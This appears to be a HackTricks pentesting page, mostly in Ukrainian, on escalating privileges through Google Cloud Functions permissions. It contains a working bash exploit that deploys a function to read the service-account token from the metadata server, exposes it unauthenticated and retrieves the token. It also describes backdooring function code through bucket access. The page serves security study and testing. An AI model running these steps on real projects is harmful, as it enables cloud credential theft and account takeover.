# GCP - Cloudfunctions Privesc

{{#include ../../../banners/hacktricks-training.md}}

## cloudfunctions

Детальніше про Cloud Functions:

{{#ref}}
../gcp-services/gcp-cloud-functions-enum.md
{{#endref}}

### `cloudfunctions.functions.create` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Атакуючий з такими привілеями може **створити новий Cloud Function з довільним (шкідливим) кодом і призначити йому Service Account**. Потім leak токен Service Account з метаданих, щоб підвищити привілеї до нього.\
Можуть знадобитися деякі привілеї для виклику функції.

Exploit scripts for this method can be found [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py) and [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py) and the prebuilt .zip file can be found [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions).

### `cloudfunctions.functions.update` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Атакуючий з такими привілеями може **змінити код Function і навіть змінити прикріплений Service Account** з метою викрадення токена.

> [!CAUTION]
> Щоб розгорнути cloud functions, вам також потрібні права actAs над обліковим записом compute service account за замовчуванням або над service account, який використовується для побудови образу.

Можуть знадобитися додаткові привілеї, такі як `.call` permission для версії 1 cloudfunctions або роль `role/run.invoker` для виклику функції.

<details><summary>Оновлення Cloud Function шкідливим кодом для викрадення токена Service Account</summary>
```bash
# Create new code
temp_dir=$(mktemp -d)

cat > $temp_dir/main.py <<EOF
import subprocess

def main(request):
cmd = "curl -s -f -H 'Metadata-Flavor: Google' 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'"
result = subprocess.check_output(cmd, shell=True, text=True)
return result
EOF

echo "" > $temp_dir/requirements.txt

zip -r $temp_dir/function.zip $temp_dir/main.py $temp_dir/requirements.txt

# Update code
gcloud functions deploy <cloudfunction-name> \
--runtime python312 \
--source $temp_dir \
--entry-point main \
--service-account <sa>@$PROJECT_ID.iam.gserviceaccount.com \
--trigger-http \
--allow-unauthenticated

# Get SA token calling the new function code
gcloud functions call <cloudfunction-name>
```
</details>

> [!CAUTION]
> Якщо ви отримуєте помилку `Permission 'run.services.setIamPolicy' denied on resource...`, це тому, що ви використовуєте параметр `--allow-unauthenticated` і у вас недостатньо прав для цього.

The exploit script for this method can be found [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py).

### `cloudfunctions.functions.sourceCodeSet`

Маючи цей дозвіл, ви можете отримати **підписаний URL, щоб завантажити файл у bucket функції (але код функції не буде змінений, вам все одно потрібно його оновити)**

<details><summary>Згенерувати підписаний URL для завантаження для Cloud Function</summary>
```bash
# Generate the URL
curl -X POST https://cloudfunctions.googleapis.com/v2/projects/{project-id}/locations/{location}/functions:generateUploadUrl \
-H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
-d '{}'
```
</details>

Не зовсім впевнений, наскільки корисним є лише цей дозвіл з точки зору атакуючого, але добре знати.

### `cloudfunctions.functions.setIamPolicy` , `iam.serviceAccounts.actAs`

Надайте собі будь-який з попередніх привілеїв **`.update`** або **`.create`** для ескалації.

### `cloudfunctions.functions.update`

Маючи лише права **`cloudfunctions`**, без **`iam.serviceAccounts.actAs`** ви **не зможете оновити функцію, ТОМУ ЦЕ НЕ Є ДІЙСНИМ PRIVESC.**

### Read & Write Access over the bucket

Якщо у вас є доступ на читання та запис до bucket, ви можете моніторити зміни в коді і щоразу, коли відбувається **оновлення в bucket, ви можете замінити новий код своїм**, так що нова версія Cloud Function буде запущена з поданим backdoored code.

Ви можете дізнатися більше про атаку в:

{{#ref}}
gcp-storage-privesc.md
{{#endref}}

Однак ви не можете використати це для попереднього компрометації сторонніх Cloud Functions, тому що якщо ви створите bucket у своєму акаунті і дасте йому публічні дозволи, щоб зовнішній проєкт міг записувати в нього, ви отримаєте наступну помилку:

<figure><img src="../../../images/image (1) (1) (1).png" alt="" width="304"><figcaption></figcaption></figure>

> [!CAUTION]
> Однак це може бути використано для DoS-атак.

### Read & Write Access over Artifact Registry

Коли створюється Cloud Function, новий docker image пушиться в Artifact Registry проєкту. Я пробував замінити image на інший, і навіть видалити поточний image (та `cache` image), але нічого не змінилося — Cloud Function продовжувала працювати. Тому, можливо, **можна зловживати Race Condition attack**, як у випадку з bucket, щоб змінити docker container, який буде запущений, але **просто модифікування збереженого image не дає можливості скомпрометувати Cloud Function**.

## References

- [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{{#include ../../../banners/hacktricks-training.md}}
